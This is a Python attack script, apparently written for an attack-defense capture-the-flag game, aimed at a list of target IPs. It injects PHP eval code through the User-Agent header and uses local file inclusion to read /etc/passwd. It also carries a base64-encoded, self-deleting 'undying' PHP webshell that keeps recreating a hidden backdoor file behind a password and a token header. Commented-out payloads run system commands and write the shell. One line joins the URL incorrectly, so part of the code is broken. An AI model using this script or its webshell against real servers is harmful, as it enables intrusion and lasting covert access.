#--coding:utf-8 --
import requests



def include_shell(ip):
    url = 'http://' + ip + 'logfile'
    res = requests.get(url,timeout=3,headers=headers)
    with open('1.txt','w') as f:
        print(res.status_code)
        print(res.text,file=f)

headers = {
    'User-Agent': '<?php eval($_POST)',
    'Content-Type': 'application/x-www-form-urlencoded'
}



# proxy = {'http':'http://127.0.0.1:8080'}
shell_name = '.HHH_DSB.php'  # 不死马文件名
shell_data = "PD9waHAKCXNldF90aW1lX2xpbWl0KDApOwoJaWdub3JlX3VzZXJfYWJvcnQoMSk7Cgl3aGlsZSgxKXsKICAgICRmaWxlID0gZm9wZW4oIi5kZWJ1Z19iYWNrdHJhY2UucGhwIiwgInciKTsKICAgICR0eHQgPSAiUEQ5d2FIQUtDa0JsY25KdmNsOXlaWEJ2Y25ScGJtY29NQ2s3Q2lSbGVIQmxZM1JsWkZSdmEyVnVJRDBnSjFoWldFNW9UVlJKTUZGMWRYVjFOek0wZVRnelozSjNQVDBuT3dwcFppQW9hWE56WlhRb0pGOVRSVkpXUlZKYkowaFVWRkJmUkVOVVQwdEZUa1ZFSjEwcElDWW1JQ1JmVTBWU1ZrVlNXeWRJVkZSUVgwUkRWRTlMUlU1RlJDZGRJRDA5UFNBa1pYaHdaV04wWldSVWIydGxiaWtnZXdvSkpHWnBibVFnUFNCQUpGOVFUMU5VV3lkVk1sVnBaRE5wTVdRblhUc0tDV1YyWVd3b0pHWnBibVFwT3dwOUlHVnNjMlVnZXdvSkpITjBZWFZ6WDJOdlpHVWdQU0FpU0ZSVVVDOHhMakVnTkRBMElFNXZkQ0JHYjNWdVpDSTdDZ2xvWldGa1pYSW9KSE4wWVhWelgyTnZaR1VwT3dvZ0lDQWdaWGhwZENncE93cDkiOwogICAgJGNvbnRlbnQgPSBiYXNlNjRfZGVjb2RlKCR0eHQpOwogICAgZndyaXRlKCRmaWxlLCAkY29udGVudCk7CiAgICBmY2xvc2UoJGZpbGUpOwoJCXVzbGVlcCgyMDAwKTsKCX0="
# 写入不死马创建的后门内容
# 激活该不死马会有自删除功能，不断生成".debug_backtrace.php",密码U2Uid3i1d，需设置请求头"DCTOKENED",值为"XYXNhMTI0Quuuu734y83grw=="

# data = "a=echo '--------';system('whoami');"

# data = {'a': "$abc = '" + shell_name + "';$data = '" + shell_data + "';$detxt = base64_decode($data);file_put_contents($abc, $detxt);echo 'successfully.';"}

logfile = '?file=/etc/passwd'


with open('ip.txt', 'r', encoding='utf-8') as file:
    flags = file.readlines()

for flag in flags:
    data_flag = flag.strip()
    print(flag.strip())
    include_shell(flag.strip())


